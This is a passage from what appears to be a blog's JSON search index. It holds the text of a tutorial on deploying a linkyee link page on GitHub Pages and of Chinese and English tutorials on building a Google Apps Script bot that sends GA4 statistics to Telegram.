LinkTree Page Using GitHub PagesCrea...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版linkyee — Quickly and Free Create Your Personal LinkTree Page Using GitHub PagesCreate your own link page quickly using GitHub Pages, 100% free, customizable, and supports custom domains.Resultshttps://link.zhgchg.li I have open-sourced the results and packaged them into a Template Repo (linkyee). Friends in need can directly fork it for quick deployment.linkyee — Your Own Link PagesAdvantages: Directly deployed on GitHub Pages, stable and free Control over the HTML source files, allowing you to modify layouts, styles, remove ads, and copyright notices; (the default style was created using GenAI ChatGPT) Supports custom domain names Supports dynamic variables, such as the default variables I created for Medium followers and GitHub repo star counts, which can automatically update the follower count on the page. 🚀🚀🚀 Fast page loading You can complete the setup and deployment in just a few simple steps as described in this article.GitHub PagesGitHub Pages is a free static page hosting service provided by GitHub. All GitHub Free accounts can use it for public repositories, while private repositories require a paid upgrade to the GitHub account.Limitations Can only host static file resources: HTML, CSS, JavaScript, font files, image files, PDFs, audio files, text files, etc. Website (Repo) size must not exceed: 1 GB (this is likely a soft limit, as my GitHub Pages Jekyll Repo is already close to 5 GB). Maximum deployment time: 10 minutes Maximum deployments per hour: 10 times (soft limit) Monthly traffic limit: 100 GB (soft limit) Frequent requests may result in an HTTP 429 response.Other GitHub Pages Application Articles My Jekyll Blog Deployed on GitHub Pages ➡️ ZhgChgLi Seamless Transfer from Medium to GitHub Pages GitHub Pages Custom Domain TutorialGetting Started — Deploying on GitHub PagesStep 1. Click the “Use this template” button at the top right of the linkyee template repository -&gt; “Create a new repository”:Step 2. Check “Include all branches,” enter your desired GitHub Pages repository name, and click “Create repository” when done: The name of the GitHub Pages Repo will be the access URL. If you enter the Repo name as your-username.github.io, this will become the direct access URL for your GitHub Pages site. If you already have a your-username.github.io Repo, then the GitHub Pages URL will be your-username.github.io/Repo-Name.Wait for the fork to complete. You may encounter deployment errors during the initial setup due to permission issues with the forked repository. Next, we will make adjustments step by step.Step 4. Go to Settings -&gt; Actions -&gt; General, and ensure the following options are selected: Actions permissions: Allow all actions and reusable workflows Workflow permissions: Read and write permissionsAfter selecting, click the Save button to save changes.Step 5. Go to Settings -&gt; Pages, and confirm that the GitHub Pages branch is set to “gh-pages”: The message “Your site is live at: XXXX” is your GitHub Pages public access URL.Step 6. Go to Settings -&gt; Actions, and wait for the first deployment to complete:Step 7. Visit the GitHub Pages URL to confirm if the fork was successful: Congratulations! Deployment was successful, and now you can modify the configuration files to replace them with your information. 🎉🎉🎉ConfigurationConfiguration FileEdit the config.yml file located in the root directory.# Website Configuration # Theme name, corresponding to the directory: ./theme/xxxx theme: default # HTML language setting lang: \"en\" # Plugins (implemented in ./plugins/PLUGIN_NAME) # Use {{ vars.PLUGIN_NAME }} in the settings below # The output of the plugin can be used below, for example: {{vars.MediumFollowersCountPlugin}} plugins: # Automatically fetch Medium follower count - MediumFollowersCountPlugin: username: zhgchgli # Automatically fetch GitHub repository star count - GithubRepoStarsCountPlugin: - ZhgChgLi/ZMarkupParser - ZhgChgLi/ZReviewTender - ZhgChgLi/ZMediumToMarkdown - ZhgChgLi/linkyee # Google Analytics tracking ID google_analytics_id: # HTML title title: \"ZhgChgLi's Link Collection\" # Avatar image path avatar: \"./images/profile.jpeg\" # Name block text name: \"@zhgchgli\" # Tagline block text tagline: &gt;- An iOS, web, and automation developer from Taiwan, passionate about sharing, traveling, and writing. # Link list # icon: Use Font Awesome icons (https://fontawesome.com/search?o=r&amp;m=free) # text: Text displayed on the link # title: Link title # url: Link URL # alt: Alternative text (for accessibility) # target: `_blank` opens in a new tab, `_self` opens in the same page links: - link: icon: \"fa-brands fa-medium\" text: \"Technical Blog &lt;span class='link-button-text'&gt;({{vars.MediumFollowersCountPlugin}} Followers)&lt;/span&gt;\" url: \"https://blog.zhgchg.li\" alt: \"ZhgChgLi's Technical Blog\" title: \"ZhgChgLi's Technical Blog\" target: \"_blank\" - link: icon: \"fa-brands fa-medium\" text: \"Travel Journal &lt;span class='link-button-text'&gt;({{vars.MediumFollowersCountPlugin}} Followers)&lt;/span&gt;\" url: \"https://medium.com/ztravel\" alt: \"ZhgChgLi's Travel Journal\" title: \"ZhgChgLi's Travel Journal\" target: \"_blank\" - link: icon: \"fa-solid fa-rss\" text: \"Personal Website\" url: \"https://zhgchg.li/\" alt: \"ZhgChgLi's Website\" title: \"ZhgChgLi's Website\" target: \"_blank\" - link: icon: \"fa-brands fa-swift\" text: \"ZMarkupParser &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/ZMarkupParser']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/ZMarkupParser\" alt: \"ZMarkupParser is a pure Swift library for converting HTML strings into NSAttributedString with custom styles.\" title: \"ZMarkupParser is a pure Swift library for converting HTML strings into NSAttributedString with custom styles.\" target: \"_blank\" - link: icon: \"fa-brands fa-app-store-ios\" text: \"ZReviewTender &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/ZReviewTender']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/ZReviewTender\" alt: \"ZReviewTender is a tool for fetching app reviews from the App Store and Google Play Console and integrating them into workflows.\" title: \"ZReviewTender is a tool for fetching app reviews from the App Store and Google Play Console and integrating them into workflows.\" target: \"_blank\" - link: icon: \"fa-brands fa-markdown\" text: \"ZMediumToMarkdown &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/ZMediumToMarkdown']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/ZMediumToMarkdown\" alt: \"ZMediumToMarkdown is a powerful tool for easily downloading and converting Medium articles to Markdown format.\" title: \"ZMediumToMarkdown is a powerful tool for easily downloading and converting Medium articles to Markdown format.\" target: \"_blank\" - link: icon: \"fa-brands fa-github\" text: \"linkyee &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/linkyee']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/linkyee\" alt: \"linkyee is a fully customizable and open-source LinkTree alternative that can be directly deployed on GitHub Pages.\" title: \"linkyee is a fully customizable and open-source LinkTree alternative that can be directly deployed on GitHub Pages.\" target: \"_blank\" # Social Media Links List # icon: Use Font Awesome icons (https://fontawesome.com/search?o=r&amp;m=free) # title: Link title # url: Social media link URL # alt: Alternative text (for accessibility) # target: `_blank` opens in a new tab, `_self` opens in the same page socials: - social: icon: \"fa-brands fa-medium\" url: \"https://blog.zhgchg.li\" title: \"ZhgChgLi's Medium\" alt: \"ZhgChgLi's Medium\" target: \"_blank\" - social: icon: \"fa-brands fa-github\" url: \"https://github.com/ZhgChgLi\" title: \"ZhgChgLi's GitHub\" alt: \"ZhgChgLi's GitHub\" target: \"_blank\" - social: icon: \"fa-brands fa-twitter\" url: \"https://twitter.com/zhgchgli\" title: \"ZhgChgLi's Twitter\" alt: \"ZhgChgLi's Twitter\" target: \"_blank\" - social: icon: \"fa-brands fa-linkedin\" url: \"https://www.linkedin.com/in/zhgchgli/\" title: \"ZhgChgLi's LinkedIn\" alt: \"ZhgChgLi's LinkedIn\" target: \"_blank\" - social: icon: \"fa-brands fa-instagram\" url: \"https://www.instagram.com/zhgchgli/\" title: \"Instagram\" alt: \"ZhgChgLi's Instagram\" target: \"_blank\" - social: icon: \"fa-solid fa-envelope\" url: \"zhgchgli@gmail.com\" title: \"Email: zhgchgli@gmail.com\" alt: \"zhgchgli@gmail.com\" target: \"_blank\" # Footer Text footer: &gt; Welcome to my website! Follow me on Medium or GitHub for the latest updates, or stay connected on Instagram and LinkedIn. # Footer Copyright Notice # Linkyee is a 100% free open-source project — you can modify the copyright notice as you wish. :) copyright: &gt; © 2024 &lt;a href=\"https://zhgchg.li\" target=\"_blank\"&gt;ZhgChgLi&lt;/a&gt;. Powered by &lt;a href=\"https://github.com/ZhgChgLi/linkyee\" target=\"_blank\"&gt;linkyee&lt;/a&gt;. Please note that after each modification of the file, you need to wait for GitHub Actions to complete the automatic build and page deployment tasks. Refresh the page to apply the changes.🚀Success!!Customize Style, Modify Default Theme ./themes/default/index.html ./themes/default/styles.css ./themes/default/scripts.jsCreate a New Theme ./themes/ YOUR_THEME Update to theme:YOUR_THEME in the config.yml file.Yes, you can use GenAI tools like ChatGPT to help you create a customized link page! (The default style was also generated using ChatGPT)Automatic RedeploymentBy default, the project will automatically redeploy once a day to refresh the dynamic variable values of the plugins. You can adjust the cron settings in Github Action — Automatic build ( .github/workflows/build.yml):schedule: - cron: '0 0 * * *' # Executes daily at midnight 00:00 (UTC)If you do not need scheduled redeployments, you can simply delete the schedule block.Custom Domain ❤️❤️❤️You can set up a custom GitHub Pages domain, for example, mine: https://link.zhgchg.li .You can refer to my previous article “GitHub Pages Custom Domain Tutorial” for step-by-step instructions from purchasing to binding the domain, or you can buy a domain through my Namecheap affiliate link — I will receive a small commission, which will help me continue contributing to open-source projects.Buy Me a Coffee ❤️❤️❤️https://www.buymeacoffee.com/zhgchgliIf this project has been helpful to you, please consider starring the repo, recommending it to friends, or buying me a coffee. Thank you for your support!Feel free to raise issues or submit fixes or contributions through pull requests. :)If you have any questions or suggestions, please contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 581 Total Views Last Statistics Date: 2025-08-15 | 493 Views on Medium." }, { "title": "簡單 3 步驟 — 打造免費 GA4 自動數據通知機器人", "url": "/posts/zrealm-robotic-process-automation/%E7%B0%A1%E5%96%AE-3-%E6%AD%A5%E9%A9%9F-%E6%89%93%E9%80%A0%E5%85%8D%E8%B2%BB-ga4-%E8%87%AA%E5%8B%95%E6%95%B8%E6%93%9A%E9%80%9A%E7%9F%A5%E6%A9%9F%E5%99%A8%E4%BA%BA-1e85b8df2348/", "categories": "ZRealm Robotic Process Automation", "tags": "automation, google-apps-script, telegram, google-analytics, rpa-solutions", "date": "2024-10-20 16:19:52 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.簡單 3 步驟 — 打造免費 GA4 自動數據通知機器人使用 Google Apps Script 完成 RPA，自行串接 GA4 + Telegram Bot 數據通知機器人Photo by BoliviaInteligen...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.簡單 3 步驟 — 打造免費 GA4 自動數據通知機器人使用 Google Apps Script 完成 RPA，自行串接 GA4 + Telegram Bot 數據通知機器人Photo by BoliviaInteligente前言大約從 2020 年開始就自己在摸索使用手邊工具實現 RPA，從一開始只是為了自動化個人例行任務，到後來工作也加入了規模更大型的組織，時常會遇到跨團隊或仰賴人與人的任務、甚至是重複性任務，才發現 RPA 自動化的效益所在。舉例來說：某個重複任務每個月會發生 10 次，每次需花費 30 分鐘處理，有 60 人會遇到，每年團隊等於消耗 3,600 小時在這上面，如果能投資 100 小時開發成自動化，後續解放出來的時間，就能投入在更有價值的工作上；實際等於 3,600 浪費的工時＋3,600 更值得投資的產出。詳細可參考我之前的文章： 2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密 使用 Google Apps Script 實現每日數據報表 RPA 自動化其他做過的 RPA： [GMail to Slack] 運用 Google Apps Script 轉發 Gmail 信件到 Slack [Google Form x Google Sheet xSlack] Slack 打造全自動 WFH 員工健康狀況回報系統 [Big Query x Slack ] Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 [Google Analytics x Slack] Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate [Github Webhook x Line Notify] 使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier [Slack x OpenAI (ChatGTP) ] Slack &amp; ChatGPT Integration [Google Analytics x Google Sheet] 使用 Google Apps Script 實現每日數據報表 RPA 自動化 [iOS Shortcut x Line x Reminders] iOS 捷徑自動化應用場景 — 自動轉發簡訊與自動建立提醒待辦事項 [Apple Store API x Google Play Console API x Github Action] Github Action x ZReviewTender 免費快速部署你的 App 商城評價監控機器人 [Telegram Bot] 10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知 [Medium to Jekyllrb] 無痛轉移 Medium 到自架網站從後台數據看之前蠻多文章有被 ChatGPT 或各種 GenAI 服務收錄，間接的幫助了許多非工程背景但也想嘗試使用 RPA 解決問題的朋友，因此我仍會持續分享自己生活或工作上遇到的 RPA 場景跟我的解決方案與大家分享 — ZRealm Robotic Process Automation 。工商時間如果您與您的團隊有自動化工具、流程串接需求，不論是 Slack App 開發、Notion、Asana、Google Sheet、Google Form、GA 數據，各種串接需求，歡迎與我 聯絡開發 。本篇 Google Analytics 4 x Telegram Bot這次要介紹的串接場景是接續上一篇「 10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知 」時想到我的 Medium 備份站「 zhgchg.li 」一直都沒有關注他的 GA4 網站數據，想說好像可以多做一個通知機器人，每日傳送過去 7 天的網站數據到指定的 Telegram Channel 讓我知道。本篇只是小品，如果要做完整的自動化數據報表請參考之前的文章「 使用 Google Apps Script 實現每日數據報表 RPA 自動化 」另外之前也曾串過 GA4 撈取 App Crash-free rate 可參考此篇文章「 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate 」。 Google Apps Script 免費限制、詳細使用、部署、功能介紹本篇不會再多介紹，請參考 之前文章 。 Telegram Bot 創建、使用本篇也不會再多介紹，同樣請參考 之前文章 。成果先上最終效果，Google Apps Script 每日下午 12–13 點之間會自動去撈取我想要的 Google Analytics 4 網站數據並組合成訊息透過 Telegram Bot 傳送到我的 Telegram Channel，我可以快速檢閱近 7 天網站數據。我想要觀測的數據是： 近 7 天 7daysAgo ~ today 總瀏覽數 screenPageViews 活躍使用者數 active7DayUsers 新使用者數 newUsers Top 10 瀏覽頁面 screenPageViews / pageTitle 新使用者最初來源媒介 newUsers / firstUserSourceMedium 實際可依照你自己的需求使用 GA Dev Tools 產生調整。Step 1. 使用 GA4 Query Explorer 官方工具 產生數據報表查詢參數首先，我們需要使用 GA4 Query Explorer 官方提供的工具產生我們需要的查詢數據報表參數： Select Property: 記下你的 property 編號 property 編號稍後撰寫 Google Apps Script 會使用。 start date, end date: 報表開始～結束的日期範圍，可使用 YYYY-MM-DD 或 yesterday , today , NdaysAgo 魔術變數。 metrics: 選擇你想要查詢的指標 dimensions: 選擇你想要查詢的維度 metric aggregations: 數據合併計算規則這邊以我的場景為例： property 編號: 318495208 start_date: 7daysAgo end_date: yesterday 因 GA 數據報表會延遲，查詢前一天～七天最準確。 metric aggregations: total其他 filter, limit 可依照自己需求設定：filter 我用不到留空；limit 我輸入 10，因為我只想知道 Top 10。點擊「MAKE REQUEST」產生對應的數據報表查詢參數及結果：記下以下請求參數，稍後撰寫 Google Apps Script 會使用：{ \"dimensions\": [ { \"name\": \"pageTitle\" } ], \"metrics\": [ { \"name\": \"screenPageViews\" } ], \"dateRanges\": [ { \"startDate\": \"7daysAgo\", \"endDate\": \"yesterday\" } ], \"limit\": \"10\", \"metricAggregations\": [ \"TOTAL\" ]}結果： 與 GA 上的數據比較是否正確，正確相符 ✅✅✅Step 2. 建立 Google Apps Script &amp; 使用 Google Analytics Data API 查詢資料 前往 https://script.google.com/home 建立新專案，命名專案名稱 點擊「服務」-&gt;「+」新增服務 選擇「Google Analytics Data API」 點擊「新增」貼上 Google Analytics Data API 查詢程式碼並組合：將前面步驟產生的報表查詢數據參數：{ \"dimensions\": [ { \"name\": \"pageTitle\" } ], \"metrics\": [ { \"name\": \"screenPageViews\" } ], \"dateRanges\": [ { \"startDate\": \"7daysAgo\", \"endDate\": \"yesterday\" } ], \"limit\": \"10\", \"metricAggregations\": [ \"TOTAL\" ]}轉換成程式：function execute() { Logger.log(JSON.stringify(fetchScreenPageViews(\"318495208\")));}// 拆成獨立方法，方便日後重複使用...// 預設 startDate=7daysAgo, endDate=yesterday// 其他用法：// e.g. fetchScreenPageViews(\"1111\". \"3daysAgo\", \"yesterday\")// e.g. fetchScreenPageViews(\"2222\". \"yesterday\", \"today\")function fetchScreenPageViews(propertyId, startDate = \"7daysAgo\", endDate = \"yesterday\") { const screenPageViewsMetric = AnalyticsData.newMetric(); screenPageViewsMetric.name = \"screenPageViews\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const pageTitleDimension = AnalyticsData.newDimension(); pageTitleDimension.name = \"pageTitle\"; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [pageTitleDimension]; request.metrics = [screenPageViewsMetric]; request.dateRanges = dateRange; request.limit = 10; request.metricAggregations = \"TOTAL\"; return AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId);}程式碼解析：// metric 指標，可以是多個，請分開宣告...const screenPageViewsMetric = AnalyticsData.newMetric();screenPageViewsMetric.name = \"screenPageViews\";// 例如另一個 active1DayUsers：const active1DayUsersMetric = AnalyticsData.newMetric();active1DayUsersMetric.name = \"active1DayUsers\";// 宣告日期範圍const dateRange = AnalyticsData.newDateRange();dateRange.startDate = startDate;dateRange.endDate = endDate;// dimension 維度，可以是多個，請分開宣告...const pageTitleDimension = AnalyticsData.newDimension();pageTitleDimension.name = \"pageTitle\";// 例如另一個 dimension：const firstUserSourceMediumDimension = AnalyticsData.newDimension();firstUserSourceMediumDimension.name = \"firstUserSourceMedium\";//// 產生 Request 物件const request = AnalyticsData.newRunReportRequest();request.metrics = [active1DayUsersMetric, active1DayUsersMetric]; // 多個就都帶入...request.dimensions = [pageTitleDimension, firstUserSourceMediumDimension]; // 多個就都帶入...request.dateRanges = dateRange;// 只需要前 10 筆資料 (Top 10)request.limit = 10;// 設定數據合併計算邏輯：Total (SUM)request.metricAggregations = \"TOTAL\";// 產生查詢結果return AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId).rows;第一次執行，會需要授權(日後若程式碼有新增需要的權限也會要重新認證一次)： 實際上就是授權 Google Apps Script 日後使用你的帳號身份執行這些程式，所以需要確保你選擇的帳號身份有對應的 GA 報表存取權限。 撰寫好程式碼後，點擊「偵錯」-&gt; 點擊「審查權限」 選擇要執行的身份帳戶，通常等於當前 Google Apps Script 帳戶 選擇「進階」展開 -&gt; 點擊「前往 XXX」這是我們自己寫給自己用的應用程式，不需經過 Google 驗證。 點擊「允許」允許之後再點「偵錯」或「執行」就能執行程式：這邊我們先使用 Logger.log(JSON.stringify()) 取得輸出結果：{ \"kind\": \"analyticsData#runReport\", \"dimensionHeaders\": [ { \"name\": \"pageTitle\" } ], \"rowCount\": 71, \"metadata\": { \"currencyCode\": \"TWD\", \"timeZone\": \"Asia/Taipei\" }, \"rows\": [ { \"dimensionValues\": [ { \"value\": \"ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"166\" } ] }, { \"metricValues\": [ { \"value\": \"109\" } ], \"dimensionValues\": [ { \"value\": \"Apple Watch 原廠不鏽鋼米蘭錶帶開箱 | ZhgChgLi\" } ] }, { \"dimensionValues\": [ { \"value\": \"iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居 | ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"101\" } ] }, { \"dimensionValues\": [ { \"value\": \"Medium Partner Program 終於對全球(包含台灣)寫作者開放啦！ | ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"85\" } ] }, { \"metricValues\": [ { \"value\": \"77\" } ], \"dimensionValues\": [ { \"value\": \"iOS 捷徑自動化應用場景 — 自動轉發簡訊與自動建立提醒待辦事項 | ZhgChgLi\" } ] }, { \"metricValues\": [ { \"value\": \"51\" } ], \"dimensionValues\": [ { \"value\": \"遊記 9/11 名古屋一日快閃自由行 | ZhgChgLi\" } ] }, { \"metricValues\": [ { \"value\": \"42\" } ], \"dimensionValues\": [ { \"value\": \"iOS 隱私與便利的前世今生 | ZhgChgLi\" } ] }, { \"dimensionValues\": [ { \"value\": \"iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework Session | ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"34\" } ] }, { \"dimensionValues\": [ { \"value\": \"iOS ≥ 18 NSAttributedString attributes Range 合併的一個行為改變 | ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"30\" } ] }, { \"metricValues\": [ { \"value\": \"30\" } ], \"dimensionValues\": [ { \"value\": \"手工打造 HTML 解析器的那些事 | ZhgChgLi\" } ] } ], \"metricHeaders\": [ { \"type\": \"TYPE_INTEGER\", \"name\": \"screenPageViews\" } ], \"totals\": [ { \"dimensionValues\": [ { \"value\": \"RESERVED_TOTAL\" } ], \"metricValues\": [ { \"value\": \"1229\" } ] } ]} Google Apps Script 請求 GA 數據成功！🎉🎉🎉Step 3. 組合起來！Google Apps Script + GA4 + Telegram Bot依照上篇文章「 10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知 」建立你的 Telegram Bot 取得 Bot Token &amp; 想要傳送到的 Channel Chat ID 。const telegramToken = \"XXXX\" // 帶入你的 Telegram Bot Token//function execute() { const screenPageViewsReport = fetchScreenPageViews(\"318495208\"); // const total = parseInt(screenPageViewsReport.totals[0].metricValues[0].value); var message = \"總瀏覽數：\"+total.toLocaleString()+\"\\n\"; screenPageViewsReport.rows.forEach(function(element, index) { const pageTitle = element.dimensionValues[0].value; const value = parseInt(element.metricValues[0].value); message += \"[Top \"+(index + 1)+\"] \"+pageTitle+\": \"+value.toLocaleString()+\"\\n\"; }); sendNotifyMessage(message, -xxxx); // 帶入你的 Channel Chat ID}// 發送訊息到 Telegram 指定 Channel Chat IDfunction sendNotifyMessage(message, chatId) { var url = \"https://api.telegram.org/bot\"+telegramToken+\"/sendMessage\"; const payload = { \"chat_id\": chatId, \"text\": message, \"disable_web_page_preview\": true } const options = { 'method': 'post', 'contentType': 'application/json', 'muteHttpExceptions': true, 'payload': JSON.stringify(payload) }; const response = UrlFetchApp.fetch(url, options); const data = JSON.parse(response.getContentText()); if (data[\"ok\"] == undefined || data[\"ok\"] != true) { if (data[\"error_code\"] != undefined &amp;&amp; data[\"error_code\"] == 429) { Utilities.sleep(1000); sendNotifyMessage(message, chatId); } }}function fetchScreenPageViews(propertyId, startDate = \"7daysAgo\", endDate = \"yesterday\") { const screenPageViewsMetric = AnalyticsData.newMetric(); screenPageViewsMetric.name = \"screenPageViews\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const pageTitleDimension = AnalyticsData.newDimension(); pageTitleDimension.name = \"pageTitle\"; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [pageTitleDimension]; request.metrics = [screenPageViewsMetric]; request.dateRanges = dateRange; request.limit = 10; request.metricAggregations = \"TOTAL\"; return AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId);}程式碼解析：//... // 依照報表回傳的 json 找到 total 位置，parseInt 將字串轉成 INT 數字格式 // .toLocaleString() -&gt; 格式化數字，123456 -&gt; 123,456 const total = parseInt(screenPageViewsReport.totals[0].metricValues[0].value); var message = \"總瀏覽數：\"+total.toLocaleString()+\"\\n\"; // 依照報表回傳的 json 遍歷資料，組合成訊息 screenPageViewsReport.rows.forEach(function(element, index) { const pageTitle = element.dimensionValues[0].value; const value = parseInt(element.metricValues[0].value); message += \"[Top \"+(index + 1)+\"] \"+pageTitle+\": \"+value.toLocaleString()+\"\\n\"; });//...執行：點擊上方「執行」或「偵錯」並確定方法名稱是選擇「 execute 」： 成功！🎉🎉🎉設定排程定時自動執行最後一步是我們希望報表機器人能定時自動執行，從左側選單前往「觸發條件」： 選擇右下角「新增觸發條件」按鈕 選擇鐔要執行的功能：選擇 「 execute 」方法名稱 選擇執行的部署作業：選擇「 上端 」 選取活動來源：選擇「 時間驅動 」 選取時間型觸發條件類型：選擇你想要的觸發頻率 選取時段：選擇你想要每日自動觸發的時間 如果執行失敗…通知信件的頻率設定 儲存 完成！這樣時間到就會自動執行囉。 🎉🎉🎉延伸作業其他數據如 新使用者數、來源媒介等，同樣使用前面程式碼就能達成，這邊就不在重複贅述，就當成給大家的回家作業囉。有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 594 Total Views Last Statistics Date: 2025-08-15 | 570 Views on Medium." }, { "title": "Simple 3 Steps — Create a Free GA4 Automated Data Notification Bot", "url": "/posts/zrealm-robotic-process-automation/en/simple-3-steps-create-a-free-ga4-automated-data-notification-bot-1e85b8df2348/", "categories": "ZRealm Robotic Process Automation", "tags": "automation, google-apps-script, telegram, google-analytics, rpa-solutions", "date": "2024-10-20 16:19:52 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Simple 3 Steps — Create a Free GA4 Automated Data Notification BotUse Google Apps Sc...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Simple 3 Steps — Create a Free GA4 Automated Data Notification BotUse Google Apps Script to complete RPA, integrating GA4 + Telegram Bot for data notifications.Photo by BoliviaInteligenteIntroductionSince around 2020, I have been exploring how to implement RPA using the tools at hand. Initially, it was just to automate personal routine tasks, but as I joined larger organizations, I often encountered cross-team tasks or tasks reliant on human interaction, as well as repetitive tasks. This is when I realized the benefits of RPA automation.For example, if a repetitive task occurs 10 times a month, taking 30 minutes each time, and affects 60 people, the team effectively spends 3,600 hours a year on it. If we can invest 100 hours to develop automation, the time freed up can be redirected to more valuable work; this translates to 3,600 wasted work hours plus 3,600 hours of more worthwhile output.For more details, refer to my previous articles: 2021 Pinkoi Tech Career Talk — Secrets of High-Efficiency Engineering Teams Using Google Apps Script to Achieve Daily Data Report RPA AutomationOther RPA projects I have worked on: [GMail to Slack] Using Google Apps Script to Forward Gmail Messages to Slack [Google Form x Google Sheet x Slack] Creating a Fully Automated WFH Employee Health Reporting System in Slack [Big Query x Slack] Building a More Instant and Convenient Crash Tracking Tool with Crashlytics + Big Query [Google Analytics x Slack] Automatically Querying App Crash-Free Users Rate with Crashlytics + Google Analytics [Github Webhook x Line Notify] Using Google Apps Script to Create a Free Github Repo Star Notifier in Three Steps [Slack x OpenAI (ChatGPT)] Slack &amp; ChatGPT Integration [Google Analytics x Google Sheet] Using Google Apps Script to Achieve Daily Data Report RPA Automation [iOS Shortcut x Line x Reminders] iOS Shortcut Automation Use Case — Automatically Forwarding Messages and Creating Reminder Tasks [Apple Store API x Google Play Console API x Github Action] Github Action x ZReviewTender Free and Fast Deployment of Your App Store Review Monitoring Bot [Telegram Bot] Quickly Transitioning from Line Notify to Telegram Bot Notifications in 10 Minutes [Medium to Jekyllrb] Seamlessly Migrating from Medium to Self-Hosted WebsitesFrom the backend data, I noticed that many of my articles have been indexed by ChatGPT or various GenAI services, indirectly helping many friends without an engineering background who want to try using RPA to solve problems. Therefore, I will continue to share RPA scenarios and my solutions encountered in my life or work with everyone — ZRealm Robotic Process Automation.Advertisement TimeIf you and your team have automation tools or process integration needs, whether it’s Slack App development, Notion, Asana, Google Sheets, Google Forms, GA data, or various integration requirements, feel free to contact me for development.This Article: Google Analytics 4 x Telegram BotIn this article, I will introduce the integration scenario that follows the previous one, “Quickly Transitioning from Line Notify to Telegram Bot Notifications in 10 Minutes.” I realized that my Medium backup site “zhgchg.li” has not been monitoring its GA4 website data, so I thought it would be good to create a notification bot that sends the website data for the past 7 days to a designated Telegram Channel daily.This article is just a small piece. For a complete automated data report, please refer to my previous article “Using Google Apps Script to Achieve Daily Data Report RPA Automation.” Additionally, I have previously integrated GA4 to fetch App Crash-free rates; you can refer to this article “Automatically Querying App Crash-Free Users Rate with Crashlytics + Google Analytics.” This article will not cover the free limitations, detailed usage, deployment, or feature introduction of Google Apps Script; please refer to previous articles. This article will also not cover the creation and usage of Telegram Bots; please refer to previous articles.ResultsHere’s the final effect: Google Apps Script will automatically fetch the desired Google Analytics 4 website data between 12 PM and 1 PM daily and combine it into a message sent via Telegram Bot to my Telegram Channel, allowing me to quickly review the website data for the past 7 days.The data I want to observe includes: Total page views for the last 7 days 7daysAgo ~ today screenPageViews Active users active7DayUsers New users newUsers Top 10 viewed pages screenPageViews / pageTitle The initial source medium of new users newUsers / firstUserSourceMedium You can adjust according to your own needs using GA Dev Tools.Step 1. Use GA4 Query Explorer Official Tool to Generate Data Report Query ParametersFirst, we need to use the official tool GA4 Query Explorer to generate the query parameters for the data report we need: Select Property: Note down your property ID. The property ID will be used later in the Google Apps Script. Start date, end date: The date range for the report can use YYYY-MM-DD or the magic variables yesterday, today, NdaysAgo. Metrics: Choose the metrics you want to query. Dimensions: Choose the dimensions you want to query. Metric aggregations: Rules for aggregating the data.For my scenario: Property ID: 318495208 Start date: 7daysAgo End date: yesterday Since GA data reports have a delay, querying from the previous day to seven days back is the most accurate. Metric aggregations: totalOther filters and limits can be set according to your needs:I left the filter empty as I don’t need it; I entered 10 for the limit because I only want to know the Top 10.Click “MAKE REQUEST” to generate the corresponding data report query parameters and results:Note down the following request parameters, which will be used later in the Google Apps Script:{ \"dimensions\": [ { \"name\": \"pageTitle\" } ], \"metrics\": [ { \"name\": \"screenPageViews\" } ], \"dateRanges\": [ { \"startDate\": \"7daysAgo\", \"endDate\": \"yesterday\" } ], \"limit\": \"10\", \"metricAggregations\": [ \"TOTAL\" ]}Results: Compare with the data on GA to see if it is correct; it matches ✅✅✅Step 2. Create Google Apps Script &amp; Use Google Analytics Data API to Query Data Go to https://script.google.com/home Create a new project and name it. Click “Services” -&gt; “+” to add a service. Select “Google Analytics Data API”. Click “Add”.Paste the Google Analytics Data API query code and combine it:Use the report query data parameters generated in the previous steps:{ \"dimensions\": [ { \"name\": \"pageTitle\" } ], \"metrics\": [ { \"name\": \"screenPageViews\" } ], 